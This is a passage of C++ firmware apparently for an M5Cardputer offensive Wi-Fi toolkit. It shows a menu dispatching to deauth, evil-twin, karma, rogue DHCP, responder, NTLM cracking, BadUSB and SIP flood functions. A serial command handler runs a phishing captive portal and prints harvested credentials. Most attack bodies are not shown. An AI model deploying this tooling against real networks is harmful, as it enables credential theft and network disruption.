      inMenu = true;
      isOperationInProgress = false;
    }
  }
}



//-----------------------------------------------------------------------------------------------------
// --- Recherche dans le menu : version zÃ©ro-alloc ---
enum MenuMode { MENU_NAVIGATION, MENU_SEARCH };
MenuMode menuMode = MENU_NAVIGATION;

// RequÃªte bornÃ©e
static char menuSearchQuery[17] = {0};  // 16 + '\0'
static uint8_t menuSearchLen = 0;

// Vue filtrÃ©e bornÃ©e
static int16_t menuFilteredIdx[menuSize];
static int16_t menuFilteredCount = 0;

static bool menuFilterLocked = false;          // navigation sur vue filtrÃ©e
static unsigned long searchLastKeyTime = 0;
static const unsigned long searchKeyRepeatDelay = 200; // ms

// Debounce pour S : on attend le relÃ¢chement aprÃ¨s l'entrÃ©e en mode recherche
static bool searchWaitForSRelease = false;
// --- fin recherche zÃ©ro-alloc ---

static inline char lc(char c) {
  return (c >= 'A' && c <= 'Z') ? (c + 32) : c;
}

static bool icase_contains_flash(const char* hay, const char* needle, uint8_t nlen) {
  if (nlen == 0) return true;
  for (uint16_t i = 0; hay[i]; ++i) {
    if (lc(hay[i]) == lc(needle[0])) {
      uint8_t j = 1;
      while (needle[j] && hay[i + j] && (lc(hay[i + j]) == lc(needle[j]))) ++j;
      if (j == nlen) return true;
    }
  }
  return false;
}

void rebuildMenuFilter() {
  menuFilteredCount = 0;
  if (menuSearchLen == 0) {
    for (int i = 0; i < menuSize; ++i) menuFilteredIdx[menuFilteredCount++] = i;
    Serial.printf("[SEARCH] query='(empty)' -> %d match(es)\n", (int)menuFilteredCount);
    return;
  }
  for (int i = 0; i < menuSize; ++i) {
    const char* it = (const char*)menuItems[i];
    if (icase_contains_flash(it, menuSearchQuery, menuSearchLen)) {
      menuFilteredIdx[menuFilteredCount++] = i;
    }
  }
  Serial.printf("[SEARCH] query='%s' -> %d match(es)\n", menuSearchQuery, (int)menuFilteredCount);
}

int viewCount() {
  return (menuMode == MENU_SEARCH || menuFilterLocked) ? (int)menuFilteredCount : menuSize;
}

int mapViewToRealIndex(int pos) {
  if (menuMode == MENU_SEARCH || menuFilterLocked) {
    if (pos < 0 || pos >= (int)menuFilteredCount) return 0;
    return menuFilteredIdx[pos];
  }
  return pos;
}

void clampMenuSelection() {
  int total = viewCount();
  if (total <= 0) {
    currentIndex = 0;
    menuStartIndex = 0;
    return;
  }
  if (currentIndex >= total) currentIndex = total - 1;
  if (currentIndex < 0) currentIndex = 0;
  menuStartIndex = std::max(0, std::min(currentIndex, total - maxMenuDisplay));
}

char getPrintableKey() {
  for (int c = 32; c <= 126; ++c) {
    if (M5Cardputer.Keyboard.isKeyPressed((char)c)) return (char)c;
  }
  return 0;
}

void drawSearchBar() {
  const int barH = 12;
  const int y = M5.Display.height() - barH;
  M5.Display.fillRect(0, y, M5.Display.width(), barH, TFT_BLACK);
  M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
  M5.Display.setCursor(5, y + 1);
  M5.Display.print("Search: ");
  M5.Display.print(menuSearchQuery);
}

void enterSearchMode() {
  if (menuMode != MENU_SEARCH) {
    menuMode = MENU_SEARCH;
    menuFilterLocked = false;
    rebuildMenuFilter();
    currentIndex = 0;
    menuStartIndex = 0;
    lastIndex = -1;
    Serial.println("[SEARCH] enter");
  }
  drawMenu();
  drawSearchBar();
}

// Quitte la recherche : si query vide => menu complet (pas de filtre verrouillÃ©),
// sinon on verrouille la vue filtrÃ©e
void exitSearchModeAuto() {
  menuMode = MENU_NAVIGATION;
  menuFilterLocked = (menuSearchLen > 0);
  clampMenuSelection();
  lastIndex = -1;
  Serial.printf("[SEARCH] exit -> %s\n", menuFilterLocked ? "keep filtered view" : "full menu");
  drawMenu();
}

// BACKSPACE en mode recherche : effacer 1 caractÃ¨re (si vide, on reste en recherche
// avec liste complÃ¨te)
void clearSearchBackspaceOne() {
  if (menuSearchLen > 0) {
    menuSearchQuery[--menuSearchLen] = '\0';
  }
  rebuildMenuFilter();
  currentIndex = 0;
  menuStartIndex = 0;
  lastIndex = -1;
  drawMenu();
  drawSearchBar();
}

//-----------------------------------------------------------------------------------------------------
void drawMenu() {
  M5.Display.fillRect(0, 13, M5.Display.width(), M5.Display.height() - 13, menuBackgroundColor);
  M5.Display.setTextSize(1.5);
  M5.Display.setTextFont(1);

  const int lineHeight = 13;
  const int startX = 5;
  const int startY = 10;

  const int total = viewCount();

  for (int i = 0; i < maxMenuDisplay; ++i) {
    int pos = menuStartIndex + i;
    if (pos >= total) break;

    int menuIndex = mapViewToRealIndex(pos);

    if (pos == currentIndex) {
      M5.Display.fillRect(0, 1 + startY + i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
      M5.Display.setTextColor(menuTextFocusedColor);
    } else {
      M5.Display.setTextColor(menuTextUnFocusedColor);
    }

    M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 3);
    M5.Display.println((const char*)menuItems[menuIndex]);
  }

  if (menuMode == MENU_SEARCH) drawSearchBar();
  M5.Display.display();
}



enum RogueDhcpMode : uint8_t { ROGUE_DHCP_STA = 0, ROGUE_DHCP_AP = 1 };
void rogueDHCP(RogueDhcpMode mode);

void executeMenuItem(int index) {
  inMenu = false;
  isOperationInProgress = true;
  switch (index) {
    case 0:  scanWifiNetworks(); break;
    case 1:  showWifiList(); break;
    case 2:  showWifiDetails(currentListIndex); break;
    case 3:  setWifiSSID(); break;
    case 4:  setWifiPassword(); break;
    case 5:  setMacAddress(); break;
    case 6:  createCaptivePortal(); break;
    case 7:  stopCaptivePortal(); break;
    case 8:  changePortal(); break;
    case 9:  checkCredentials(); break;
    case 10: deleteCredentials(); break;
    case 11: displayMonitorPage1(); break;
    case 12: probeAttack(); break;
    case 13: probeSniffing(); break;
    case 14: karmaAttack(); break;
    case 15: startAutoKarma(); break;
    case 16: karmaSpear(); break;
    case 17: listProbes(); break;
    case 18: deleteProbe(); break;
    case 19: deleteAllProbes(); break;
    case 20: wardrivingMode(); break;
    case 21: startWardivingMaster(); break;
    case 22: beaconAttack(); break;
    case 23: deauthAttack(currentListIndex); break;
    case 24: autoDeauther(); break;
    case 25: startEvilTwin(currentListIndex); break;
    case 26: sniffMaster(); break;
    case 27: allTrafficSniffer(); break;
    case 28: sniffNetwork(); break;
    case 29: wifiVisualizer(); break;
    case 30: deauthClients(); break;
    case 31: deauthDetect(); break;
    case 32: checkHandshakes(); break;
    case 33: wallOfFlipper(); break;
    case 34: connectWifi(currentListIndex); break;
    case 35: sshConnect(); break;
    case 36: scanIpPort(); break;
    case 37: scanHosts(); break;
    case 38: FullNetworkAnalysis(false); break;
    case 39: ListNetworkAnalysis(); break;
    case 40: webCrawling(); break;
    case 41: send_pwnagotchi_beacon_main(); break;
    case 42: skimmerDetection(); break;
    case 43: runMouseJiggler(); break;
    case 44: badUSB(); break;
    case 45: initBluetoothKeyboard(); break;
    case 46: reverseTCPTunnel(); break;
    case 47: startDHCPStarvation(); break;
    case 48: rogueDHCP(ROGUE_DHCP_STA); break;
    case 49: rogueDHCP(ROGUE_DHCP_AP); break;
    case 50: switchDNS(); break;
    case 51: DHCPAttackAuto(); break;
    case 52: detectPrinter(); break;
    case 53: printFile(); break;
    case 54: checkPrinterStatus(); break;
    case 55: startHoneypot(); break;
    case 56: evilLLMChatStream(); break;
    case 57: EvilChatMesh(); break;
    case 58: sdToUsb(); break;
    case 59: responder(); break;
    case 60: wpadAbuse(); break;
    case 61: crackNTLMv2(); break;
    case 62: CleanNTLMHashes(); break;
    case 63: fileManager(); break;
    case 64: startUARTShell(); break;
    case 65: sipScan(); break;
    case 66: sipEnumExtensions(); break;
    case 67: sipSpoofMessage(); break;
    case 68: sipFlood(); break;
    case 69: sipRingAll(); break;
    case 70: scanCCTVCameras(); break;
    case 71: fakeSSDP(); break;
    case 72: skyjackDroneMode(); break;
    case 73: WifiDeadDrop(); break;
    case 74: bleNameFloodUI(); break;
    case 75: wallOfAirTags(); break;
    case 76: FindMyEvilTx(); break;
    case 77: listUPnPMappings(); break;
    case 78: upnpTargetNATWorkflow(); break;
    case 79: runLDAPDomainDump(); break;
    case 80: showSettingsMenu(); break;
  }
  isOperationInProgress = false;
}


unsigned long buttonPressTime = 0;
bool buttonPressed = false;

void enterDebounce() {
  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    M5.update();
    M5Cardputer.update();
    delay(10); // Petit dÃ©lai pour rÃ©duire la charge du processeur
  }
}

void backDebounce() {
  while (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
    M5Cardputer.update();
    delay(10); // Petit dÃ©lai pour rÃ©duire la charge du processeur
  }
}

void handleMenuInput() {
  static unsigned long lastKeyPressTime = 0;
  const unsigned long keyRepeatDelay = 150;
  static bool keyHandled = false;
  static int previousIndex = -1;

  enterDebounce();
  M5.update();
  M5Cardputer.update();

  bool stateChanged = false;

  // ----- Ouverture recherche -----
  if (menuMode == MENU_NAVIGATION) {
    if (M5Cardputer.Keyboard.isKeyPressed('s') || M5Cardputer.Keyboard.isKeyPressed('S')) {
      searchWaitForSRelease = true;   // EmpÃªche le 's' de s'ajouter Ã  la requÃªte
      enterSearchMode();
      return;
    }
  }

  // ----- MODE RECHERCHE -----
  if (menuMode == MENU_SEARCH) {
    // Tant que 's' est maintenu aprÃ¨s l'entrÃ©e, on ne lit aucun caractÃ¨re
    if (searchWaitForSRelease) {
      if (M5Cardputer.Keyboard.isKeyPressed('s') || M5Cardputer.Keyboard.isKeyPressed('S')) {
        return; // attendre le relÃ¢chement
      } else {
        searchWaitForSRelease = false;
      }
    }

    // BACKSPACE -> effacer 1 char (si vide, liste complÃ¨te visible)
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      if (millis() - searchLastKeyTime > searchKeyRepeatDelay) {
        clearSearchBackspaceOne();
        searchLastKeyTime = millis();
      }
      return;
    }

    // ENTER -> quitter recherche ; si query vide => menu complet, sinon vue filtrÃ©e
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      exitSearchModeAuto();
      return;
    }

    // Ajout caractÃ¨re imprimable
    char typed = getPrintableKey();
    if (typed != 0) {
      if (millis() - searchLastKeyTime > searchKeyRepeatDelay) {
        if (typed != '\n' && typed != '\r') {
          if (menuSearchLen < sizeof(menuSearchQuery) - 1) {
            menuSearchQuery[menuSearchLen++] = typed;
            menuSearchQuery[menuSearchLen] = '\0';
            rebuildMenuFilter();
            currentIndex = 0;
            menuStartIndex = 0;
            lastIndex = -1;
            drawMenu();
            drawSearchBar();
          } // sinon: buffer plein -> ignore
          searchLastKeyTime = millis();
        }
      }
      return;
    }

    // 'S' de nouveau en recherche -> no-op (barre dÃ©jÃ  affichÃ©e)
    if (M5Cardputer.Keyboard.isKeyPressed('s') || M5Cardputer.Keyboard.isKeyPressed('S')) {
      return;
    }
    return;
  }

  // ----- MODE NAVIGATION (liste complÃ¨te ou filtrÃ©e verrouillÃ©e) -----
  int total = viewCount();

  if (M5Cardputer.Keyboard.isKeyPressed(KEY_LEFT_CTRL) && M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
    if (millis() - lastKeyPressTime > keyRepeatDelay) {
      doTheThing();
      lastKeyPressTime = millis();
      stateChanged = true;
    }
    keyHandled = true;

  } else if (M5Cardputer.Keyboard.isKeyPressed(';')) {
    if (millis() - lastKeyPressTime > keyRepeatDelay) {
      currentIndex--;
      if (currentIndex < 0) currentIndex = total - 1;
      lastKeyPressTime = millis();
      stateChanged = true;
    }
    keyHandled = true;

  } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
    if (millis() - lastKeyPressTime > keyRepeatDelay) {
      currentIndex++;
      if (currentIndex >= total) currentIndex = 0;
      lastKeyPressTime = millis();
      stateChanged = true;
    }
    keyHandled = true;

  } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
    if (millis() - lastKeyPressTime > keyRepeatDelay) {
      currentIndex += 3;
      if (currentIndex >= total) currentIndex %= std::max(1, total);
      lastKeyPressTime = millis();
      stateChanged = true;
    }
    keyHandled = true;

  } else if (M5Cardputer.Keyboard.isKeyPressed(',')) {
    if (millis() - lastKeyPressTime > keyRepeatDelay) {
      currentIndex -= 3;
      while (currentIndex < 0) currentIndex += std::max(1, total);
      lastKeyPressTime = millis();
      stateChanged = true;
    }
    keyHandled = true;

  } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    int realIndex = mapViewToRealIndex(currentIndex);
    executeMenuItem(realIndex);
    stateChanged = true;
    keyHandled = true;

  } else if (M5Cardputer.Keyboard.isKeyPressed('s') || M5Cardputer.Keyboard.isKeyPressed('S')) {
    searchWaitForSRelease = true;  // debounce pour Ã©viter 's' dans la requÃªte Ã  l'ouverture
    enterSearchMode();
    return;

  } else {
    keyHandled = false;
  }

  if (!keyHandled) lastKeyPressTime = 0;

  if (stateChanged || currentIndex != previousIndex) {
    clampMenuSelection();
    drawMenu();
    previousIndex = currentIndex;
  }
}






const uint8_t line1_hex[] = {
  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
  0x2D, 0x2D
};
const size_t line1_len = sizeof(line1_hex);

const uint8_t line2_hex[] = {
  0x20, 0x54, 0x68, 0x61, 0x6E, 0x6B, 0x20, 0x79,
  0x6F, 0x75, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x75,
  0x73, 0x69, 0x6E, 0x67, 0x20, 0x45, 0x76, 0x69,
  0x6C
};
const size_t line2_len = sizeof(line2_hex);

const uint8_t line3_hex[] = {
  0x20, 0x20, 0x20, 0x6D, 0x61, 0x64, 0x65, 0x20,
  0x77, 0x69, 0x74, 0x68, 0x20, 0x3C, 0x33, 0x20,
  0x6C, 0x6F, 0x76, 0x65, 0x20, 0x62, 0x79
};
const size_t line3_len = sizeof(line3_hex);

const uint8_t line4_hex[] = {
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x37, 0x68, 0x33,
  0x30, 0x74, 0x68, 0x33, 0x72, 0x30, 0x6E, 0x33
};
const size_t line4_len = sizeof(line4_hex);

const uint8_t line5_hex[] = {
  0x20, 0x20, 0x20, 0x20, 0x20, 0x45, 0x74, 0x68,
  0x69, 0x63, 0x61, 0x6C, 0x20, 0x48, 0x61, 0x63,
  0x6B, 0x65, 0x72, 0x2E
};
const size_t line5_len = sizeof(line5_hex);

const uint8_t line6_hex[] = {
  0x20, 0x20, 0x20, 0x43, 0x69, 0x74, 0x69, 0x7A,
  0x65, 0x6E, 0x20, 0x6F, 0x66, 0x20, 0x74, 0x68,
  0x65, 0x20, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x2E
};
const size_t line6_len = sizeof(line6_hex);

const uint8_t line7_hex[] = {
  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
  0x2D, 0x2D
};
const size_t line7_len = sizeof(line7_hex);

const uint8_t line8_hex[] = {
  0x49, 0x74, 0x27, 0x73, 0x20, 0x61, 0x6C, 0x6C,
  0x20, 0x61, 0x62, 0x6F, 0x75, 0x74, 0x20, 0x69,
  0x6E, 0x74, 0x65, 0x6E, 0x73, 0x69, 0x74, 0x79,
  0x2E
};
const size_t line8_len = sizeof(line8_hex);

const uint8_t line9_hex[] = {
  0x20, 0x20, 0x20, 0x54, 0x68, 0x65, 0x72, 0x65,
  0x20, 0x69, 0x73, 0x20, 0x6E, 0x6F, 0x20, 0x73,
  0x70, 0x6F, 0x6F, 0x6E, 0x2E
};
const size_t line9_len = sizeof(line9_hex);

const uint8_t line10_hex[] = {
  0x20, 0x20, 0x20, 0x20, 0x48, 0x61, 0x63, 0x6B, 0x20,
  0x74, 0x68, 0x65, 0x20, 0x70, 0x6C, 0x61, 0x6E,
  0x65, 0x74, 0x2E
};
const size_t line10_len = sizeof(line10_hex);

const uint8_t line11_hex[] = {
  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
  0x2D, 0x2D
};
const size_t line11_len = sizeof(line11_hex);

const uint8_t* allLines[] = {
  line1_hex, line2_hex, line3_hex, line4_hex, line5_hex,
  line6_hex, line7_hex, line8_hex, line9_hex, line10_hex,
  line11_hex,
};

const size_t allLinesLen[] = {
  line1_len, line2_len, line3_len, line4_len, line5_len,
  line6_len, line7_len, line8_len, line9_len, line10_len,
  line11_len,
};

const int numLines = sizeof(allLines) / sizeof(allLines[0]);
void hexToString(const uint8_t* data, size_t length, char* output) {
  for (size_t i = 0; i < length; i++) {
    output[i] = (char)data[i];
  }
  output[length] = '\0';
}

void doTheThing() {
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextColor(GREEN, BLACK);
  M5.Lcd.setTextSize(1.5);
  M5.Lcd.setCursor(0, 0);
  char buffer[64];
  for (int i = 0; i < numLines; i++) {
    hexToString(allLines[i], allLinesLen[i], buffer);
    const char* p = buffer;
    while (*p) {
      M5.Lcd.print(*p++);
      delay(50);
    }
    M5.Lcd.println();
    delay(200);
  }
  while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    M5.update();
    M5Cardputer.update();
    delay(100);
  }
  waitAndReturnToMenu("Return to menu");
}


void handleDnsRequestSerial() {
  dnsServer.processNextRequest();
  server.handleClient();
  checkSerialCommands();
}

void listProbesSerial() {
  File file = SD.open("/evil/probes.txt", FILE_READ);
  if (!file) {
    Serial.println(F("Failed to open probes.txt"));
    return;
  }

  int probeIndex = 0;
  Serial.println(F("List of Probes:"));
  while (file.available()) {
    String probe = file.readStringUntil('\n');
    probe.trim();
    if (probe.length() > 0) {
      Serial.println(String(probeIndex) + ": " + probe);
      probeIndex++;
    }
  }
  file.close();
}

void selectProbeSerial(int index) {
  File file = SD.open("/evil/probes.txt", FILE_READ);
  if (!file) {
    Serial.println(F("Failed to open probes.txt"));
    return;
  }

  int currentIndex = 0;
  String selectedProbe = "";
  while (file.available()) {
    String probe = file.readStringUntil('\n');
    if (currentIndex == index) {
      selectedProbe = probe;
      break;
    }
    currentIndex++;
  }
  file.close();

  if (selectedProbe.length() > 0) {
    clonedSSID = selectedProbe;
    Serial.println("Probe selected: " + selectedProbe);
  } else {
    Serial.println(F("Probe index not found."));
  }
}

String currentlySelectedSSID = "";
bool isProbeAttackRunning = false;
bool stopProbeSniffingViaSerial = false;
bool isProbeSniffingRunning = false;

void checkSerialCommands() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    if (command == "scan_wifi") {
      isOperationInProgress = true;
      inMenu = false;
      scanWifiNetworks();
      for (int i = 0; i < numSsid; i++) {
        if ((int)ssidList.size() <= i) ssidList.resize(i+1);
        ssidList[i] = WiFi.SSID(i);
      }
    } else if (command.startsWith("select_network")) {
      int ssidIndex = command.substring(String("select_network ").length()).toInt();
      selectNetwork(ssidIndex);
    } else if (command.startsWith("change_ssid ")) {
      String newSSID = command.substring(String("change_ssid ").length());
      cloneSSIDForCaptivePortal(newSSID);
      Serial.println("Cloned SSID changed to: " + clonedSSID);
    } else if (command.startsWith("set_portal_password ")) {
      String newPassword = command.substring(String("set_portal_password ").length());
      captivePortalPassword = newPassword;
      Serial.println("Captive portal password changed to: " + captivePortalPassword);
    } else if (command.startsWith("set_portal_open")) {
      captivePortalPassword = "";
      Serial.println(F("Open Captive portal set"));
    } else if (command.startsWith("detail_ssid")) {
      int ssidIndex = command.substring(String("detail_ssid ").length()).toInt();
      String security = getWifiSecurity(ssidIndex);
      int32_t rssi = WiFi.RSSI(ssidIndex);
      uint8_t* bssid = WiFi.BSSID(ssidIndex);
      String macAddress = bssidToString(bssid);
      M5.Display.display();
      Serial.println(F("------Wifi-Info----"));
      Serial.println("SSID: " + (ssidList[ssidIndex].length() > 0 ? ssidList[ssidIndex] : "N/A"));
      Serial.println("Channel: " + String(WiFi.channel(ssidIndex)));
      Serial.println("Security: " + security);
      Serial.println("Signal: " + String(rssi) + " dBm");
      Serial.println("MAC: " + macAddress);
      Serial.println(F("-------------------"));
    } else if (command == "clone_ssid") {
      cloneSSIDForCaptivePortal(currentlySelectedSSID);
      Serial.println("Cloned SSID: " + clonedSSID);
    } else if (command == "start_portal") {
      createCaptivePortal();
    } else if (command == "stop_portal") {
      stopCaptivePortal();
    } else if (command == "list_portal") {
      File root = SD.open("/evil/sites");
      numPortalFiles = 0;
      portalFiles.clear();
      portalFiles.reserve(50);
      Serial.println(F("Available portals:"));
      while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
          String fileName = file.name();
          if (fileName.endsWith(".html")) {
            String full = String("/evil/sites/") + fileName;
            portalFiles.push_back(full);
            numPortalFiles = (int)portalFiles.size();
            Serial.print(numPortalFiles - 1);
            Serial.print(F(": "));
            Serial.println(fileName);
          }
        }
        file.close();
      }
      root.close();
    } else if (command.startsWith("change_portal")) {
      int portalIndex = command.substring(String("change_portal ").length()).toInt();
      changePortal(portalIndex);
    } else if (command == "check_credentials") {
      checkCredentialsSerial();
    } else if (command == "monitor_status") {
      String status = getMonitoringStatus();
      Serial.println(F("-------------------"));
      Serial.println(status);
    } else if (command == "probe_attack") {
      isOperationInProgress = true;
      inMenu = false;
      isItSerialCommand = true;
      probeAttack();
      delay(200);
    } else if (command == "stop_probe_attack") {
      if (isProbeAttackRunning) {
        isProbeAttackRunning = false;
        Serial.println(F("-------------------"));
        Serial.println(F("Stopping probe attack..."));
        Serial.println(F("-------------------"));
      } else {
        Serial.println(F("-------------------"));
        Serial.println(F("No probe attack running."));
        Serial.println(F("-------------------"));
      }
    } else if (command == "probe_sniffing") {
      isOperationInProgress = true;
      inMenu = false;
      probeSniffing();
      delay(200);
    } else if (command == "stop_probe_sniffing") {
      stopProbeSniffingViaSerial = true;
      isProbeSniffingRunning = false;
      Serial.println(F("-------------------"));
      Serial.println(F("Stopping probe sniffing via serial..."));
      Serial.println(F("-------------------"));
    } else if (command == "list_probes") {
      listProbesSerial();
    } else if (command.startsWith("select_probes ")) {
      int index = command.substring(String("select_probes ").length()).toInt();
      selectProbeSerial(index);
    } else if (command == "karma_auto") {
      isOperationInProgress = true;
      inMenu = false;
      startAutoKarma();
      delay(200);
    } else if (command == "help") {
      Serial.println(F("-------------------"));
      Serial.println(F("Available Commands:"));
      Serial.println(F("scan_wifi - Scan WiFi Networks"));
      Serial.println(F("select_network <index> - Select WiFi <index>"));
      Serial.println(F("change_ssid <max 32 char> - change current SSID"));
      Serial.println(F("set_portal_password <password min 8> - change portal password"));
      Serial.println(F("set_portal_open  - change portal to open"));
      Serial.println(F("detail_ssid <index> - Details of WiFi <index>"));
      Serial.println(F("clone_ssid - Clone Network SSID"));
      Serial.println(F("start_portal - Activate Captive Portal"));
      Serial.println(F("stop_portal - Deactivate Portal"));
      Serial.println(F("list_portal - Show Portal List"));
      Serial.println(F("change_portal <index> - Switch Portal <index>"));
      Serial.println(F("check_credentials - Check Saved Credentials"));
      Serial.println(F("monitor_status - Get current information on device"));
      Serial.println(F("probe_attack - Initiate Probe Attack"));
      Serial.println(F("stop_probe_attack - End Probe Attack"));
      Serial.println(F("probe_sniffing - Begin Probe Sniffing"));
      Serial.println(F("stop_probe_sniffing - End Probe Sniffing"));
      Serial.println(F("list_probes - Show Probes"));
      Serial.println(F("select_probes <index> - Choose Probe <index>"));
      Serial.println(F("karma_auto - Auto Karma Attack Mode"));
      Serial.println(F("-------------------"));
    } else {
      Serial.println(F("-------------------"));
      Serial.println("Command not recognized: " + command);
      Serial.println(F("-------------------"));
    }
  }
}


String getMonitoringStatus() {
  String status;
  int numClientsConnected = WiFi.softAPgetStationNum();
  int numCredentials = countPasswordsInFile();

  status += "Clients: " + String(numClientsConnected) + "\n";
  status += "Credentials: " + String(numCredentials) + "\n";
  status += "SSID: " + String(clonedSSID) + "\n";
  status += "Portal: " + String(isCaptivePortalOn ? "On" : "Off") + "\n";
  status += "Page: " + String(selectedPortalFile.substring(12)) + "\n";
  updateConnectedMACs();
  status += "Connected MACs:\n";
  for (int i = 0; i < 10; i++) {
    if (macAddresses[i] != "") {
      status += macAddresses[i] + "\n";
    }
  }
  status += "Stack left: " + getStack() + " Kb\n";
  status += "RAM: " + getRamUsage() + " Mo\n";
  status += "Battery: " + getBatteryLevel() + "%\n"; // thx to kdv88 to pointing mistranlastion
  status += "Temperature: " + getTemperature() + "C\n";
  return status;
}

void checkCredentialsSerial() {
  File file = SD.open("/evil/credentials.txt");
  if (!file) {
    Serial.println(F("Failed to open credentials file"));
    return;
  }
  bool isEmpty = true;
  Serial.println(F("----------------------"));
  Serial.println(F("Credentials Found:"));
  Serial.println(F("----------------------"));
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.length() > 0) {
      Serial.println(line);
      isEmpty = false;
    }
  }
  file.close();
  if (isEmpty) {
    Serial.println(F("No credentials found."));
  }
}

void changePortal(int index) {
  File root = SD.open("/evil/sites");
  int currentIndex = 0;
  String selectedFile;
  while (File file = root.openNextFile()) {
    if (currentIndex == index) {
      selectedFile = String(file.name());
      break;
    }
    currentIndex++;
    file.close();
  }
  root.close();
  if (selectedFile.length() > 0) {
    Serial.println("Changing portal to: " + selectedFile);
    selectedPortalFile = "/evil/sites/" + selectedFile;
  } else {
    Serial.println(F("Invalid portal index"));
  }
}

void selectNetwork(int index) {
  if (index >= 0 && index < numSsid) {
    currentlySelectedSSID = ssidList[index];
    Serial.println("SSID sÃ©lectionnÃ©: " + currentlySelectedSSID);
  } else {
    Serial.println(F("Index SSID invalide."));
  }
}

void scanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 5000) {
    M5.Display.clear();
    M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
    M5.Display.setCursor(12 , M5.Display.height() / 2 );
    M5.Display.print("Scan in progress... ");
    Serial.println(F("-------------------"));
    Serial.println(F("WiFi Scan in progress... "));
    M5.Display.display();
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }
  Serial.println(F("-------------------"));
  Serial.println(F("Near Wifi Network : "));
  numSsid = min(n, 30);
  for (int i = 0; i < numSsid; i++) {
    if ((int)ssidList.size() <= i) ssidList.resize(i+1);
    ssidList[i] = WiFi.SSID(i);
    Serial.print(i);
    Serial.print(F(": "));
    Serial.println(ssidList[i]);
  }
  Serial.println(F("-------------------"));
  Serial.println(F("WiFi Scan Completed "));
  Serial.println(F("-------------------"));
  waitAndReturnToMenu("Scan Completed");

}

void showWifiList() {
  const int ROW_H = 13;
  const int LEFT_PAD = 2;
  const int ICON_W = 28;
  const int SCROLL_W = 4;
  const int LIST_WIDTH  = M5.Display.width() - SCROLL_W;
  const int LIST_HEIGHT = M5.Display.height();

  auto clampi = [](int v, int lo, int hi){ return v < lo ? lo : (v > hi ? hi : v); };

  auto drawLockIcon = [&](int x, int y, bool locked) {
    if (!locked) return;
    M5.Display.drawRoundRect(x, y+2, 8, 6, 1, TFT_WHITE);
    M5.Display.drawLine(x+2, y+2, x+2, y, TFT_WHITE);
    M5.Display.drawLine(x+5, y+2, x+5, y, TFT_WHITE);
    M5.Display.drawLine(x+2, y,   x+5, y, TFT_WHITE);
  };

  auto drawRssiBars = [&](int x, int y, int32_t rssi) {
    int lvl = 0;
    if      (rssi > -65) lvl = 4;
    else if (rssi > -75) lvl = 3;
    else if (rssi > -85) lvl = 2;
    else if (rssi > -95) lvl = 1;
    else                 lvl = 0;
    const int bw = 2, gap = 1, h0 = 3;
    for (int i = 0; i < 4; ++i) {
      int h = h0 + i*2;
      int bx = x + i*(bw + gap);
      int by = y + (ROW_H - 2) - h;
      uint16_t c = (i < lvl) ? TFT_GREEN : menuTextUnFocusedColor;
      M5.Display.fillRect(bx, by, bw, h, c);
    }
  };

  auto truncateToWidth = [&](String s, int maxW) {
    if (maxW <= 0) return String("");
    if (M5.Display.textWidth(s) <= maxW) return s;
    String e = "...";
    while (s.length() > 0 && M5.Display.textWidth(s + e) > maxW) {
      s.remove(s.length() - 1);
    }
    return String(s + e);
  };

  auto drawScrollbar = [&](int startIndex, int visible, int total) {
    int x = M5.Display.width() - SCROLL_W;
    M5.Display.fillRect(x, 0, SCROLL_W, LIST_HEIGHT, menuBackgroundColor);
    if (total <= visible) return;
    int trackH = LIST_HEIGHT;
    int thumbH = max(8, (trackH * visible) / total);
    int maxStart = max(1, total - visible);
    int thumbY = (trackH - thumbH) * startIndex / maxStart;
    M5.Display.fillRect(x+1, thumbY, SCROLL_W-2, thumbH, menuTextUnFocusedColor);
  };

  auto isLocked = [&](int i) -> bool {
    wifi_auth_mode_t enc = WiFi.encryptionType(i);
    return enc != WIFI_AUTH_OPEN;
  };

  // Cache infos du scan
  int32_t rssiCache[30];
  uint8_t chanCache[30];
  bool    lockCache[30];
  for (int i = 0; i < numSsid; ++i) {
    rssiCache[i] = WiFi.RSSI(i);
    chanCache[i] = (uint8_t)WiFi.channel(i);
    lockCache[i] = isLocked(i);
  }

  static bool prevUp = false, prevDown = false;
  static unsigned long upHoldStart = 0, downHoldStart = 0;
  static unsigned long upLastRepeat = 0, downLastRepeat = 0;
  const unsigned long firstDelay  = 300;
  const unsigned long repeatDelay = 120;

